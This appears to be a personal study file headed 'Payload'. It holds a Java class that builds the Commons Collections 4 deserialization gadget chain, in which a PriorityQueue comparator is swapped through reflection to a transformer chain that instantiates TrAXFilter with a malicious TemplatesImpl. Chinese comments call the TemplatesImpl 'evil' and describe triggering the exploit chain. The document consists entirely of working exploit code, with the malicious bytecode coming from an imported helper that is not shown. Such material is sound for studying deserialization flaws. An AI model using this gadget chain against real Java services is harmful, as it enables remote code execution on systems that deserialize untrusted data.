# Payload 
```java
package xyz.fe1w0.java.basic.serialize.cc.four;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.util.PriorityQueue;

import static xyz.fe1w0.java.basic.classloader.templatesImpl.Exploit.setFieldValue;
import static xyz.fe1w0.java.basic.classloader.templatesImpl.Exploit.templateExploitDemo;

public class Exploit {

    public static void main(String[] args) throws Exception {
        // 获取 evil templatesImpl
        TemplatesImpl templates = templateExploitDemo();

        InvokerTransformer invokerTransformer = new InvokerTransformer(
                "toString", new Class[0], new Object[0]
        );

        PriorityQueue queue = new PriorityQueue(2, new TransformingComparator(invokerTransformer));

        queue.add(1);
        queue.add(1);

        ChainedTransformer payloadTransformer = new ChainedTransformer(
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { templateExploitDemo() }
                )
        );

        setFieldValue(queue, "comparator", new TransformingComparator(payloadTransformer));
        // 用 add 模拟触发利用链
        queue.add(1);
    }
}
```